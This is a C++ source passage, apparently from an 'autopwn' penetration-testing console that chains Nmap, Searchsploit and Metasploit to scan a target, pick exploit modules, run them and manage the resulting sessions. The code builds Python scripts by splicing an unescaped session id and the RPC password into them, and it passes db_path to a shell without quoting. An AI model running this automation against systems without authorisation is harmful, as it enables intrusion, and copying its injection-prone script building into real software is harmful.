    auto [out, rc] = exec_capture(cmd, safe_stoi(cfg.timeout_msf));
    if (rc != 0) {
        err = "msfconsole info failed (rc=" + std::to_string(rc) + ")";
    }
    return strip_ansi_codes(out);
}

static void print_msf_module_info(const std::string& output) {
    auto lines = split_lines(output);
    if (lines.empty()) {
        std::cout << Tag::WARN << Color::yellow("No module info available.\n");
        return;
    }
    for (auto& line : lines) {
        std::string trimmed = trim(line);
        if (trimmed.empty()) continue;
        size_t colon = trimmed.find(':');
        if (colon != std::string::npos && colon < 30) {
            std::string key = trimmed.substr(0, colon);
            std::string value = trim(trimmed.substr(colon + 1));
            std::cout << "  " << Color::B << Color::BCYN << key << ": "
                      << Color::R << value << "\n";
        } else {
            std::cout << "  " << trimmed << "\n";
        }
    }
}

static void cmd_searchsploit(const std::vector<std::string>& tok,
                             Config& cfg, Logger& log) {
    if (tok.size() < 2) {
        std::cout << Tag::ERR << "Usage: searchsploit <target|xml_path>\n";
        return;
    }
    std::string target = tok[1];
    std::string xml = resolve_xml_path(cfg, target);
    if (!fs::exists(xml)) {
        std::cout << Tag::ERR << "XML file not found: " << xml << "\n";
        return;
    }
    SearchsploitRunner ssr(cfg, log);
    ssr.run(xml);
}

static void cmd_exploit(const std::vector<std::string>& tok,
                        Config& cfg, Logger& log) {
    if (tok.size() < 2) {
        std::cout << Tag::ERR << "Usage: exploit [list|show|select|run] ...\n";
        return;
    }
    std::string sub = tok[1];
    if (sub == "list" || sub == "search") {
        std::string query = join_tokens(tok, 2);
        std::string err;
        auto output = list_msf_modules(cfg, query, err);
        if (!err.empty()) {
            std::cout << Tag::ERR << Color::red(err) << "\n";
            if (!output.empty()) std::cout << output << "\n";
            return;
        }
        print_msf_search_results(output);
        return;
    }
    if (sub == "show") {
        std::string module = tok.size() > 2 ? join_tokens(tok, 2) : g_selected_exploit;
        if (module.empty()) {
            std::cout << Tag::ERR << "No exploit specified. Use 'exploit show <module>' or select one with 'exploit select'.\n";
            return;
        }
        std::string err;
        auto output = get_msf_module_info(cfg, module, err);
        if (!err.empty()) {
            std::cout << Tag::ERR << Color::red(err) << "\n";
            if (!output.empty()) std::cout << output << "\n";
            return;
        }
        section("EXPLOIT MODULE INFO", Color::BMAG);
        print_msf_module_info(output);
        return;
    }
    if (sub == "select") {
        if (tok.size() < 3) {
            std::cout << Tag::ERR << "Usage: exploit select <module>\n";
            return;
        }
        g_selected_exploit = tok[2];
        std::cout << Tag::OK << "Selected exploit: "
                  << Color::BYEL << g_selected_exploit << Color::R << "\n";
        log.log("[*] exploit selected " + g_selected_exploit);
        return;
    }
    if (sub == "run") {
        if (tok.size() < 3) {
            std::cout << Tag::ERR << "Usage: exploit run <target> [rport] [module]\n";
            return;
        }
        std::string target = tok[2];
        int rport = 0;
        std::string module;
        if (tok.size() > 3) {
            if (std::all_of(tok[3].begin(), tok[3].end(), ::isdigit)) {
                rport = safe_stoi(tok[3]);
                module = (tok.size() > 4) ? tok[4] : "";
            } else {
                module = tok[3];
            }
        }
        if (rport < 0 || rport > 65535) {
            std::cout << Tag::ERR << "RPORT must be between 1 and 65535.\n";
            return;
        }
        if (module.empty()) module = g_selected_exploit;
        if (module.empty()) {
            std::cout << Tag::ERR << "No exploit module specified. Use 'exploit select' or pass a module name.\n";
            return;
        }
        if (module.find("exploit/") == std::string::npos) {
            std::cout << Tag::WARN << "Selected module does not contain 'exploit/': "
                      << Color::BYEL << module << Color::R << "\n";
        }
        run_msf_exploit(cfg, log, module, target, rport);
        return;
    }
    std::cout << Tag::ERR << "Unknown exploit subcommand: " << sub << "\n";
}

// ═════════════════════════════════════════════════════════════════
//  PYTHON BRIDGE
// ═════════════════════════════════════════════════════════════════
class PythonBridge {
public:
    explicit PythonBridge(Config& c, Logger& l) : cfg(c), log(l) {}

    bool invoke(const std::string& xml, const std::string& json) {
        section("LOGIC MAPPER", Color::BGRN);
        std::cout << Tag::INFO << "Connecting to MSF RPC at "
                  << cfg.msf_host << ":" << cfg.msf_port << "\n";
        divider();

        std::string cmd =
            "python3 ./logic_mapper.py"
            " --xml "  + shell_quote(xml)  +
            " --json " + shell_quote(json) +
            " --monitor-interval " + shell_quote(cfg.monitor_interval) +
            " 2>&1";
        log.log_cmd("logic_mapper " + xml);
        int rc = exec_stream(cmd, safe_stoi(cfg.timeout_msf));
        divider();
        if (rc == 0) {
            std::cout << Tag::OK << Color::green("Logic mapper completed.\n");
            log.log("[+] logic_mapper done");
            return true;
        }
        std::cout << Tag::ERR << Color::red("Logic mapper exited with code "
                                            + std::to_string(rc) + "\n");
        log.log("[-] logic_mapper rc=" + std::to_string(rc));
        return false;
    }

private:
    Config& cfg;
    Logger& log;
};

// ═════════════════════════════════════════════════════════════════
//  SESSION MANAGER
// ═════════════════════════════════════════════════════════════════
class SessionManager {
public:
    explicit SessionManager(Config& c, Logger& l) : cfg(c), log(l) {}

    void list() {
        section("ACTIVE SESSIONS", Color::BGRN);

        // Script Python che stampa JSON delle sessioni
        std::string script =
            "import json, sys\n"
            "try:\n"
            "    from pymetasploit3.msfrpc import MsfRpcClient\n"
            "    c = MsfRpcClient('" + cfg.msf_password + "',"
            " server='" + cfg.msf_host + "', port=" + cfg.msf_port + ")\n"
            "    s = c.sessions.list\n"
            "    print(json.dumps(s))\n"
            "except ImportError:\n"
            "    print(json.dumps({'error':'pymetasploit3 not found'}))\n"
            "except Exception as e:\n"
            "    print(json.dumps({'error':str(e)}))\n";

        fs::path tmp = temp_script_path("ap_sess");
        std::string err;
        if (!write_text_file(tmp, script, err)) {
            std::cout << Tag::ERR << Color::red("Cannot write temp script: " + err + "\n");
            return;
        }
        auto [out, rc] = exec_capture("python3 " + shell_quote(tmp.string()));
        fs::remove(tmp);
        if (rc != 0) {
            std::cout << Tag::ERR << Color::red("Session query failed with code "
                      + std::to_string(rc) + "\n");
            log.log("[-] sessions query failed rc=" + std::to_string(rc));
            return;
        }

        // Prova a parsare JSON e costruire tabella
        // (parser minimale senza dipendenze esterne)
        if (out.find("\"error\"") != std::string::npos) {
            std::cout << Tag::ERR << Color::red("Cannot reach msfrpcd: ")
                      << Color::DIM << out << Color::R << "\n";
            log.log("[-] sessions error: " + out);
            return;
        }

        // Estrai coppie key:object con regex semplice
        // Output grezzo se parsing non è possibile
        if (out.find("{}") != std::string::npos || out.empty()) {
            std::cout << Tag::WARN << Color::yellow("No active sessions.\n");
            return;
        }

        // Stampa raw con highlight — parsing completo richiederebbe
        // una lib JSON; qui coloriamo le chiavi importanti
        std::cout << Tag::INFO << "Raw session data from RPC:\n\n";
        highlight_json(out);
        log.log("[*] sessions listed");
    }

    void kill(const std::string& sid) {
        if (sid.empty()) {
            std::cout << Tag::ERR << "Usage: kill <session_id>\n"; return;
        }
        std::string script =
            "try:\n"
            "    from pymetasploit3.msfrpc import MsfRpcClient\n"
            "    c = MsfRpcClient('" + cfg.msf_password + "',"
            " server='" + cfg.msf_host + "', port=" + cfg.msf_port + ")\n"
            "    c.sessions.session('" + sid + "').stop()\n"
            "    print('[+] Session " + sid + " terminated.')\n"
            "except Exception as e:\n"
            "    print(f'[-] {e}')\n";
        fs::path tmp = temp_script_path("ap_kill");
        std::string err;
        if (!write_text_file(tmp, script, err)) {
            std::cout << Tag::ERR << Color::red("Cannot write temp script: " + err + "\n");
            return;
        }
        exec_stream("python3 " + shell_quote(tmp.string()));
        fs::remove(tmp);
        log.log("[*] kill session " + sid);
    }

private:
    Config& cfg;
    Logger& log;

    // Minimal JSON syntax highlighter
    static void highlight_json(const std::string& s) {
        bool in_str = false;
        bool key    = true;
        for (size_t i = 0; i < s.size(); ++i) {
            char c = s[i];
            if (c == '"') {
                in_str = !in_str;
                if (in_str) std::cout << (key ? Color::BCYN : Color::BYEL);
                else        { std::cout << '"' << Color::R; key = false; continue; }
            }
            if (!in_str && (c == '{' || c == '}' || c == '[' || c == ']'))
                std::cout << Color::BMAG;
            if (!in_str && c == ':') { std::cout << Color::DIM; key = false; }
            if (!in_str && c == ',') { std::cout << Color::R;   key = true;  }
            std::cout << c;
            if (!in_str && (c == '{' || c == '}' || c == '[' || c == ']'
                           || c == ':' || c == ','))
                std::cout << Color::R;
        }
        std::cout << Color::R << "\n";
    }
};

// ═════════════════════════════════════════════════════════════════
//  DB REPORT
// ═════════════════════════════════════════════════════════════════
class DbReport {
public:
    explicit DbReport(Config& c, Logger& l) : cfg(c), log(l) {}
    void show() {
        section("DATABASE REPORT", Color::BBLU);
        if (!fs::exists(cfg.db_path)) {
            std::cout << Tag::WARN << Color::yellow("No database at ")
                      << cfg.db_path << " — run a scan first.\n";
            return;
        }
        std::cout << Tag::INFO << "DB: "
                  << Color::DIM << cfg.db_path << Color::R << "\n\n";
        exec_stream("python3 ./db_report.py " + cfg.db_path);
        log.log("[*] report shown");
    }
private:
    Config& cfg;
    Logger& log;
};

// ═════════════════════════════════════════════════════════════════
//  WORKSPACE MANAGER
// ═════════════════════════════════════════════════════════════════
class WorkspaceManager {
public:
    explicit WorkspaceManager(Config& c, Logger& l) : cfg(c), log(l) {}

    void run(const std::vector<std::string>& tok) {
        std::string sub = tok.size() > 1 ? tok[1] : "list";

        if (sub == "list") {
            section("WORKSPACES", Color::BYEL);
            bool found = false;
            if (fs::exists(cfg.output_dir)) {
                Table t({"Workspace", "Path", "Status"});
                for (auto& e : fs::directory_iterator(cfg.output_dir)) {
                    if (!e.is_directory()) continue;
                    std::string name = e.path().filename().string();
                    if (name.rfind("ws_", 0) != 0) continue;
                    std::string ws_name = name.substr(3);
                    std::string status  = (ws_name == cfg.workspace)
                                          ? Color::BGRN + "active" + Color::R
                                          : "idle";
                    t.add_row({ws_name, e.path().string(), status});
                    found = true;
                }
                if (found) t.print();
            }
            if (!found)
                std::cout << Tag::INFO << "No workspaces yet.\n";

        } else if (sub == "switch" || sub == "use") {
            std::string name = tok.size() > 2 ? tok[2] : "";
            if (name.empty()) {
                std::cout << Tag::ERR << "Usage: workspace use <name>\n";
                return;
            }
            cfg.workspace = name;
            std::string err;
            if (!safe_create_directories(cfg.ws_dir(), err)) {
                std::cout << Tag::ERR << Color::red("Cannot create workspace directory: " + err + "\n");
                log.log("[-] workspace create dir failed: " + err);
                return;
            }
            std::cout << Tag::OK << "Switched to workspace: "
                      << Color::BYEL << name << Color::R << "\n";
            log.log("[*] workspace → " + name);

        } else if (sub == "new") {
            std::string name = tok.size() > 2 ? tok[2] : "";
            if (name.empty()) {
                std::cout << Tag::ERR << "Usage: workspace new <name>\n";
                return;
            }
            cfg.workspace = name;
            std::string err;
            if (!safe_create_directories(cfg.ws_dir(), err)) {
                std::cout << Tag::ERR << Color::red("Cannot create workspace directory: " + err + "\n");
                log.log("[-] workspace create dir failed: " + err);
                return;
            }
            std::cout << Tag::OK << "Created & switched to: "
                      << Color::BYEL << name << Color::R << "\n";
            log.log("[*] workspace new " + name);

        } else if (sub == "delete") {
            std::string name = tok.size() > 2 ? tok[2] : "";
            if (name.empty() || name == "default") {
                std::cout << Tag::ERR << "Cannot delete 'default'.\n"; return;
            }
            std::string path = cfg.output_dir + "/ws_" + sanitize(name);
            if (fs::exists(path)) {
                fs::remove_all(path);
                std::cout << Tag::OK << "Deleted workspace: " << name << "\n";
                if (cfg.workspace == name) {
                    cfg.workspace = "default";
                    std::cout << Tag::INFO << "Switched back to default.\n";
                }
            } else {
                std::cout << Tag::WARN << "Workspace not found: " << name << "\n";
            }
        } else {
            std::cout << Tag::ERR
                      << "Usage: workspace [list|new|use|delete] [name]\n";
        }
    }

private:
    Config& cfg;
    Logger& log;
};

// ═════════════════════════════════════════════════════════════════
//  SET / SHOW COMMANDS
// ═════════════════════════════════════════════════════════════════
static void cmd_set(const std::vector<std::string>& tok, Config& cfg,
                    Logger& log) {
    if (tok.size() < 3) {
        std::cout << Tag::ERR << "Usage: set <key> <value>\n"
                  << Tag::INFO << "Type 'show' to list all options.\n";
        return;
    }
    std::string key = tok[1];
    std::string val = tok[2];
    auto fm = cfg.fields();
    if (fm.count(key)) {
        std::string old = *fm[key];
        *fm[key] = val;
        std::cout << Tag::OK << key << " => "
                  << Color::BYEL << val << Color::R
                  << Color::DIM << "  (was: " << old << ")" << Color::R << "\n";
        log.log("[*] set " + key + "=" + val);
    } else {
        std::cout << Tag::ERR << "Unknown option: " << key
                  << " — type 'show'\n";
    }
}

static void cmd_show(const Config& cfg) {
    section("CURRENT OPTIONS", Color::BCYN);

    Table t({"Option", "Value", "Description"});
    auto add = [&](const std::string& k, const std::string& v,
                   const std::string& d) { t.add_row({k, v, d}); };

    add("msf_host",             cfg.msf_host,             "Metasploit RPC host");
    add("msf_port",             cfg.msf_port,             "Metasploit RPC port");
    add("msf_password",         std::string(cfg.msf_password.size(),'*'),
                                                          "Metasploit RPC password");
    add("workspace",            cfg.workspace,            "Active workspace");
    add("output_dir",           cfg.output_dir,           "Results base directory");
    add("monitor_interval",     cfg.monitor_interval,     "Session poll interval (s)");
    add("post_pipeline_wait",   cfg.post_pipeline_wait,   "Post-pipeline wait (s)");
    add("timeout_nmap",         cfg.timeout_nmap,         "Nmap timeout (s, 0=off)");
    add("timeout_searchsploit", cfg.timeout_searchsploit, "Searchsploit timeout (s)");
    add("timeout_msf",          cfg.timeout_msf,          "MSF RPC timeout (s)");
    add("db_path",              cfg.db_path,              "SQLite database path");
    add("log_dir",              cfg.log_dir,              "Log output directory");
    t.print();
}

// ═════════════════════════════════════════════════════════════════
//  HELP
// ═════════════════════════════════════════════════════════════════
static void print_help() {
    section("HELP", Color::BCYN);

    auto row = [](const std::string& cmd, const std::string& args,
                  const std::string& desc) {
        std::cout << "  " << Color::BGRN << std::left << std::setw(12) << cmd
                  << "  " << Color::BYEL << std::left << std::setw(30) << args
                  << Color::R << Color::DIM << desc << Color::R << "\n";
    };

    std::cout << "\n  " << Color::B << Color::BCYN
              << "Scanning\n" << Color::R;
    row("scan",      "<target>",               "Full pipeline: nmap+searchsploit+msf");
    row("nmap",      "<target>",               "Run Nmap only");

    std::cout << "\n  " << Color::B << Color::BCYN
              << "Sessions\n" << Color::R;
    row("sessions",  "",                       "List active MSF sessions");
    row("kill",      "<id>",                   "Terminate a session");

    std::cout << "\n  " << Color::B << Color::BCYN
              << "Data\n" << Color::R;
    row("report",    "",                       "Show SQLite report");

    std::cout << "\n  " << Color::B << Color::BCYN
              << "Configuration\n" << Color::R;
    row("set",       "<option> <value>",       "Set an option on the fly");
    row("show",      "",                       "Show all current options");
    row("config",    "",                       "Interactive config wizard");
    row("workspace", "[list|new|use|delete]",  "Manage workspaces");
    row("searchsploit", "<xml_or_target>",     "Run Searchsploit on an existing Nmap XML");
    row("exploit",     "list [query]",        "List MSF exploit modules from msfconsole");
    row("exploit",     "show [module]",       "Show details for selected or specified module");
    row("exploit",     "select <module>",     "Choose an exploit module for later runs");
    row("exploit",     "run <target> [rport] [module]", "Execute a selected MSF exploit");
    row("msf",         "list [query]",        "Alias for exploit list");

    std::cout << "\n  " << Color::B << Color::BCYN
              << "Misc\n" << Color::R;
    row("banner",    "",                       "Print a new random banner");
    row("clear",     "",                       "Clear the terminal screen");
    row("help",      "",                       "This help");
    row("exit",      "",                       "Quit");

    std::cout << "\n  " << Color::B << "Examples\n" << Color::R;
    std::cout << Color::DIM << "  autopwn > " << Color::R
              << "scan 192.168.1.10\n";
    std::cout << Color::DIM << "  autopwn > " << Color::R
              << "set timeout_nmap 300\n";
    std::cout << Color::DIM << "  autopwn > " << Color::R
              << "workspace new lab_01\n";
    std::cout << Color::DIM << "  autopwn > " << Color::R
              << "kill 2\n";
    std::cout << "\n";
}

// ═════════════════════════════════════════════════════════════════
//  CONFIG WIZARD
// ═════════════════════════════════════════════════════════════════
static void config_wizard(Config& cfg, Logger& log) {
    section("CONFIGURATION WIZARD", Color::BMAG);
    std::cout << Color::DIM << "  Press Enter to keep current value.\n\n"
              << Color::R;

    auto ask = [](const std::string& lbl, const std::string& cur) {
        std::cout << "  " << Color::BCYN << std::left << std::setw(28) << lbl
                  << Color::DIM << "[" << cur << "]" << Color::BCYN
                  << ": " << Color::R;
        std::string v; std::getline(std::cin, v);
        return v.empty() ? cur : v;
    };

    std::cout << Color::BMAG << "  [ Metasploit RPC ]\n" << Color::R;
    cfg.msf_host     = ask("host",     cfg.msf_host);
    cfg.msf_port     = ask("port",     cfg.msf_port);
    cfg.msf_password = ask("password", cfg.msf_password);

    std::cout << Color::BMAG << "\n  [ Scanner ]\n" << Color::R;
    cfg.output_dir         = ask("output_dir",         cfg.output_dir);
    cfg.monitor_interval   = ask("monitor_interval",   cfg.monitor_interval);
    cfg.post_pipeline_wait = ask("post_pipeline_wait", cfg.post_pipeline_wait);

    std::cout << Color::BMAG << "\n  [ Timeouts (seconds) ]\n" << Color::R;
    cfg.timeout_nmap        = ask("timeout_nmap",        cfg.timeout_nmap);
    cfg.timeout_searchsploit= ask("timeout_searchsploit",cfg.timeout_searchsploit);
    cfg.timeout_msf         = ask("timeout_msf",         cfg.timeout_msf);

    std::cout << Color::BMAG << "\n  [ Database ]\n" << Color::R;
    cfg.db_path = ask("db_path", cfg.db_path);

    std::cout << Color::BMAG << "\n  [ Logging ]\n" << Color::R;
    cfg.log_dir = ask("log_dir", cfg.log_dir);

    std::cout << "\n";
    std::cout << Color::BCYN << "  Save? [Y/n]: " << Color::R;
    std::string yn; std::getline(std::cin, yn);
    if (yn.empty() || yn == "y" || yn == "Y") {
        std::string verr;
        if (!cfg.validate(verr)) {
            std::cout << Tag::ERR << Color::red("Invalid config: " + verr + "\n");
            log.log("[-] config invalid: " + verr);
        } else {
            cfg.save();
            std::cout << Tag::OK << Color::green("config.ini saved.\n");
            log.log("[*] config saved");
        }
    } else {
        std::cout << Tag::WARN << "Changes discarded.\n";
    }
}

// ═════════════════════════════════════════════════════════════════
//  DISPATCH
// ═════════════════════════════════════════════════════════════════
static int dispatch(const std::vector<std::string>& tok,
                    Config& cfg, Logger& log) {
    if (tok.empty()) return 0;
    const std::string& cmd = tok[0];
    std::string a1 = tok.size() > 1 ? tok[1] : "";

    NmapRunner       nmr(cfg, log);
    SearchsploitRunner ssr(cfg, log);
    PythonBridge     pb(cfg, log);
    SessionManager   sm(cfg, log);
    DbReport         dr(cfg, log);
    WorkspaceManager wm(cfg, log);

    log.log_cmd(cmd + (a1.empty() ? "" : " " + a1));

    if (cmd == "scan") {
        if (a1.empty()) { std::cout << Tag::ERR << "Usage: scan <target>\n"; return 1; }
        g_target = a1;
        std::string xml = nmr.run(a1);
        if (xml.empty()) return 2;
        std::string json = ssr.run(xml);
        pb.invoke(xml, json);
        return 0;
    }
    if (cmd == "nmap") {
        if (a1.empty()) { std::cout << Tag::ERR << "Usage: nmap <target>\n"; return 1; }
        g_target = a1;
        nmr.run(a1);
        return 0;
    }
    if (cmd == "searchsploit") { cmd_searchsploit(tok, cfg, log); return 0; }
    if (cmd == "exploit" || cmd == "msf") { cmd_exploit(tok, cfg, log); return 0; }
    if (cmd == "sessions")  { sm.list();         return 0; }
    if (cmd == "kill")      { sm.kill(a1);       return 0; }
    if (cmd == "report")    { dr.show();         return 0; }
    if (cmd == "banner")    { print_banner(cfg); return 0; }
    if (cmd == "clear" || cmd == "cls") { clear_screen(); return 0; }
    if (cmd == "show")      { cmd_show(cfg);     return 0; }
    if (cmd == "set")       { cmd_set(tok, cfg, log); return 0; }
    if (cmd == "workspace") { wm.run(tok);       return 0; }
    if (cmd == "config")    {
        config_wizard(cfg, log);
        cfg.load(cfg.config_path);
        return 0;
    }
    if (cmd == "help" || cmd == "?" || cmd == "--help" || cmd == "-h") {
        print_help(); return 0;
    }
    if (cmd == "exit" || cmd == "quit" || cmd == "q")
        return -99;

    std::cout << Tag::ERR << "Unknown command: "
              << Color::BYEL << cmd << Color::R
              << " — type " << Color::DIM << "help" << Color::R << "\n";
    return 1;
}

// ═════════════════════════════════════════════════════════════════
//  INTERACTIVE LOOP
// ═════════════════════════════════════════════════════════════════
static void interactive_loop(Config& cfg, Logger& log) {
#if HAS_READLINE
    init_readline();
#endif
    std::cout << Color::DIM
              << "  Type " << Color::R << "help"
              << Color::DIM << " for commands, "
              << Color::R   << "exit"
              << Color::DIM << " to quit.\n"
              << (HAS_READLINE
                  ? "  Tab autocomplete and ↑↓ history enabled.\n"
                  : "  (install libreadline for history+tab)\n")
              << Color::R << "\n";

    while (true) {
        std::string line = read_line(cfg);
        if (line.empty()) continue;

        auto tok = tokenize(line);
        if (tok.empty()) continue;
        std::transform(tok[0].begin(), tok[0].end(),
                       tok[0].begin(), ::tolower);

        int rc = dispatch(tok, cfg, log);
        if (rc == -99) {
            std::cout << "\n" << Color::cyan("  Goodbye.\n\n");
            break;
        }
        std::cout << "\n";
    }
}

// ═════════════════════════════════════════════════════════════════
//  MAIN
// ═════════════════════════════════════════════════════════════════
int main(int argc, char* argv[]) {
    Config cfg;
    cfg.load("config.ini");

    std::string verr;
    if (!cfg.validate(verr)) {
        std::cerr << Tag::ERR << Color::red("Invalid configuration: " + verr + "\n");
        return 1;
    }

    // Logger: un file per sessione con timestamp
    {
        std::string err;
        if (!safe_create_directories(cfg.log_dir, err)) {
            std::cerr << Tag::WARN << "Cannot create log directory: "
                      << err << "\n";
        }
    }
    std::string log_path =
        cfg.log_dir + "/session_" +
        [](){
            auto t = std::chrono::system_clock::to_time_t(
                         std::chrono::system_clock::now());
            char b[20];
            std::strftime(b, sizeof(b), "%Y%m%d_%H%M%S",
                          std::localtime(&t));
            return std::string(b);
        }() + ".log";
    Logger log(log_path);

    print_banner(cfg);
    std::cout << Color::DIM << "  Log → " << log_path << Color::R << "\n\n";

    // ── DIRECT MODE ──────────────────────────────────────────────
    if (argc >= 2) {
        std::vector<std::string> tok;
        for (int i = 1; i < argc; ++i) tok.push_back(argv[i]);
        std::transform(tok[0].begin(), tok[0].end(),
                       tok[0].begin(), ::tolower);
        std::cout << Color::DIM << "  [" << now_hms() << "] direct: ";
        for (auto& t : tok) std::cout << t << " ";
        std::cout << Color::R << "\n\n";
        int rc = dispatch(tok, cfg, log);
        return (rc == -99) ? 0 : rc;
    }

    // ── INTERACTIVE MODE ─────────────────────────────────────────
    interactive_loop(cfg, log);
    return 0;
}
